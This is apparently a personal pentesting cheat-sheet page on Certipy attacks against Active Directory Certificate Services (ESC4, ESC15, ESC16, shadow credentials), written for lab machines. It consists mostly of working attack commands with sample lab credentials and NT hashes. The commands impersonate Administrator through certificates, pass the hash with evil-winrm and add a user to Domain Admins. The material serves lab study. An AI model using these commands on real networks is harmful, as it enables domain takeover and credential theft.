<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>Certipy Attacks</h1>
            <p>Certipy is a tool for attacking and abusing Active Directory Certificate Services (AD CS)</p>
        </div>
        <div class="notion-body">
            <ul>
                <h2>Active Directory Certificate Services (ADCS) | Template Haijacking - ESC4  </h2>
                <ul>
                    <p>Having in mind that there is a vulnerable certificate template wich has wrong configuration can be used to request certificates impersonating another user</p>
                    <p>First of all we must have permisions to use that template certificate and this template will be vulnerable if the parameter <b>"Requires Manager Approval"</b> is in <b>"false"</b></p>
                    <p>All this information can be found using <b>certipy</b> tool</p>
                    <p>Find a vulnerable certificate</p>
                    <pre><code class="language-bash"></code>certipy find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -vulnerable -stdout</pre>
                    <p>Update certificate template modifying values to make certificate vulnerable</p>
                    <pre><code class="language-bash">certipy template -u ca_svc@sequel.htb -p 'WqSZAF6CysDQbGb3' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51</code></pre>   
                    <p>Request certificate as Administrator user</p>
                    <pre><code class="language-bash">certipy req -u 'ca_svc' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -ca 'sequel-DC01-CA' -dns 'administrator.sequel.htb' -upn 'Administrator@sequel.htb'</code></pre>   
                    <p>Use the certificate obtained to authenticate in the server and get NT hash</p>
                    <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
                    <p>Authenticate using evilwinrm using the NT hash obtained </p>
                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                </ul>

                <h2>Active Directory Certificate Services (ADCS) | Arbitrary Application Policy Injection in V1 Templates ESC15 </h2>
                <ul>
                    <p>In this case the user you control has permisions over a Certificate Template. That way, using certipy we modify the template to asdd authentication and enrollment to a account we control</p>
                    <pre><code class="language-bash">certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'mypassword' -dc-ip '10.10.11.72' -target-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'</code></pre>   
                    <p>Now using the .pfx file login as the admin.</p>
                    <pre><code class="language-bash">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell</code></pre>
                    <p>Remember that inside you won't find a normal shell so we used permisions to add a user to the domain admins group</p>
                    <pre><code class="language-bash">add_user_to_group john 'Domain Admins'</code></pre>   
                </ul>

                <h2>Active Directory Certificate Services (ADCS) | Security Extension Disabled on CA (Globally) ESC16 </h2>
                <ul>
                    <p>Having in mind that CA itself it is configured to disable the inclusion of the szOID_NTDS_CA_SECURITY_EXT securty extension in all certificates it issues </p>
                    <p>So we can take advantage of it modifiying UPN of a user and requesting a certificate as that user impersonating it</p>
                    <p>All this information can be found using <b>certipy</b> tool</p>
                    <p>Read initial UPN of the victim account </p>
                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read  </code></pre>   
                    <p>Update the victim account's UPN</p>
                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update</code></pre>   
                    <p>Export the .ccache file (You must acquire it using shadow credential attack previously)</p>
                    <pre><code class="language-bash">export KRB5CCNAME=victim.ccache</code></pre>   
                    <p>Request a certificate</p>
                    <pre><code class="language-bash">certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'</code></pre>
                    <p>Use that hash to authenticate </p>
                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                </ul>

                <h2>Other certipy attacks</h2>
                <ul>
                    <h3>Shadow Credential Attack</h3>
                    <ul>
                        <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
                        <p>This kind of attack can only be performed if you have <b>GenericWrite, GenericAll o WriteDACL</b> over a user </p>
                        <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
                    </ul>
                </ul>
            </ul>
        </div>
    </div>
</body>
</html>